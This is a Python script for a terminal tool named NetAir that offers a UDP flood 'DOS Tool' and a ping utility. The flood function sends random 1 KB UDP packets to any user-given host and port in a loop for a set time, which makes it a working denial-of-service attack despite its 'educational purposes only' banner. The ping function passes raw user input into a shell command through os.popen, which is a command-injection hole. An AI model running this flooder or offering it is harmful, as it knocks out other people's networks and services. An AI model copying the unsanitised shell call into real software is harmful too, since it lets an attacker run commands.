import os
import shutil
import subprocess
import time
import threading
import socket
import platform
import re



print("Initializing...")
print("Checking for required packages...")

if shutil.which("toilet") is None:
    print("Toilet package: not found!")
    yn = input("Do you want to install toilet package?(its just for the banner) (y/n): ")
    if yn.lower() == 'y':
        try:
            subprocess.run(["pip", "install", "toilet"], check=True)
            print("Toilet package installed successfully.")
        except subprocess.CalledProcessError:
            print("Failed to install toilet package. Please install it manually.")
            exit(1)
    else:
        print("Skipping toilet package installation... (banner will not be displayed properly)")
else:
    print("Toilet package: Found")

stop_flag = False 
sent = 0
lock = threading.Lock()

def main_menu():
    os.system("clear")
    subprocess.run(["toilet", "-f", "big","-F","metal", "NETAIR"], check=True)
    print("Welcome to NetAir! This is a simple network tool!")
    print("This tool is for educational purposes only. Use responsibly.")
    print("\nMain Menu:")
    print("1. DOS Tool (UDP Flood)")
    print("2. Ping Tool")
    print("3. Exit")
    choice = input("Select an option (1-3): ")
    if choice == '1':
        dos_tool()
    elif choice == '2':
        ping_tool()
    elif choice == '3':
        print("Exiting...")
        exit(0)
    else:
        print("Invalid choice. Please try again.")
        time.sleep(2)
        main_menu()
def dos_tool():
    print("DOS Tool Selected")
    target = input("Enter Target IP/URL: ")
    port = input("Enter Port (default 80): ")
    if port == "":
        port = "80"
    duration = input("Enter Duration in seconds (default 60): ")
    if duration == "":
        duration = "60"
    duration = int(duration)

    print(f"Starting attack on {target}:{port} for {duration} seconds...")

    stop = False
    packet_count = 0
    lock = threading.Lock()

    def countdown(t):
        nonlocal stop
        time.sleep(t)
        stop = True

    def attack():
        nonlocal stop, packet_count
        while not stop:
            try:
                packet = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet.sendto(os.urandom(1024), (target, int(port)))
                with lock:
                    packet_count += 1
                print(f"Packet #{packet_count} sent")
            except:
                pass

    attack_thread = threading.Thread(target=attack)
    timer_thread = threading.Thread(target=countdown, args=(duration,))

    attack_thread.start()
    timer_thread.start()

    attack_thread.join()
    timer_thread.join()

    print(f"\nAttack finished. Total packets sent: {packet_count}")

    back = input("Back to main menu? (y/n): ")
    if back.lower() == 'y':
        main_menu()
    else:
        print("Exiting...")
        exit(0)

def ping_tool():
    pinged_time = 0
    successful_pings = 0
    failed_pings = 0

    target = input("Enter Target IP/URL to ping: ")

    system = platform.system().lower()
    if system == "windows":
        ping_cmd = f"ping -n 1 {target}"
        rtt_regex = r"Average = (\d+)ms"
    else:
        ping_cmd = f"ping -c 1 {target}"
        rtt_regex = r"time=([0-9.]+) ms"

    print(f"Pinging {target}... (Press Ctrl+C to stop)")

    rtt_list = []

    try:
        while pinged_time < 10:
            pinged_time += 1
            output = os.popen(ping_cmd).read()


            match = re.search(rtt_regex, output)

            if match:  
                rtt = float(match.group(1))
                successful_pings += 1
                rtt_list.append(rtt)
                print(f"{target} replied: RTT = {rtt} ms")
            else:
                failed_pings += 1
                print(f"{target} did not reply")

            print("Pinged time:", pinged_time)
            time.sleep(1)


        print("\nPing statistics:")
        print(f"Total pings: {pinged_time}")
        print(f"Success: {successful_pings}")
        print(f"Failed:  {failed_pings}")
        print(f"Loss:    {round((failed_pings/pinged_time)*100, 2)}%")

        if rtt_list:
            print(f"Min RTT: {min(rtt_list)} ms")
            print(f"Max RTT: {max(rtt_list)} ms")
            print(f"Avg RTT: {round(sum(rtt_list)/len(rtt_list), 2)} ms")

    except KeyboardInterrupt:
        print("\nPing test stopped manually.")

    back = input("Back to main menu? (y/n): ")
    if back.lower() == 'y':
        main_menu()
    else:
        print("Exiting...")
        exit(0)


# Start the program
time.sleep(1)
main_menu()
